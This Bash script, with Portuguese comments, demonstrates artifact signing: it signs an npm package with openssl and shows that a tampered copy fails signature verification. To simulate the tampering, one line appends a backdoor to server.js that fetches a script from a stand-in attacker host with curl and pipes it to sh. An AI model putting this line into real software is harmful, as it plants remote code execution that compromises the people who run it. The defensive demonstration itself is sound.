#!/bin/bash
# ATAQUE 3 (versão local, sem Kubernetes) - mesmo princípio do cosign + Kyverno:
# só é aceito o artefato cuja assinatura confere com a chave pública do pipeline.
set -u
T=$(mktemp -d)
echo "=== Pipeline: gera par de chaves e empacota o artefato oficial ==="
openssl genpkey -algorithm ed25519 -out $T/pipeline.key 2>/dev/null
openssl pkey -in $T/pipeline.key -pubout -out $T/pipeline.pub
npm pack --silent --pack-destination $T >/dev/null && mv $T/tarefas-api-*.tgz $T/oficial.tgz
echo "Digest do artefato oficial: sha256:$(sha256sum $T/oficial.tgz | cut -c1-64)"
openssl pkeyutl -sign -inkey $T/pipeline.key -rawin -in $T/oficial.tgz -out $T/oficial.sig
echo "--- Verificação do artefato oficial (o que o cluster faz antes de rodar):"
openssl pkeyutl -verify -pubin -inkey $T/pipeline.pub -rawin -in $T/oficial.tgz -sigfile $T/oficial.sig

echo ""
echo "=== ATAQUE 3: invasor gera um artefato próprio (com backdoor), fora do pipeline ==="
mkdir -p $T/x && tar -xzf $T/oficial.tgz -C $T/x
echo "require('child_process').exec('curl http://invasor.exemplo/x | sh');" >> $T/x/package/src/server.js
tar -czf $T/adulterado.tgz -C $T/x package
echo "Digest do artefato adulterado: sha256:$(sha256sum $T/adulterado.tgz | cut -c1-64)"
echo "--- Tentando passar o artefato adulterado com a assinatura do oficial:"
openssl pkeyutl -verify -pubin -inkey $T/pipeline.pub -rawin -in $T/adulterado.tgz -sigfile $T/oficial.sig
RESULTADO=$?
[ $RESULTADO -ne 0 ] && echo "=== RESULTADO: artefato RECUSADO - assinatura não confere ===" || echo "!!! aceito"
rm -rf $T
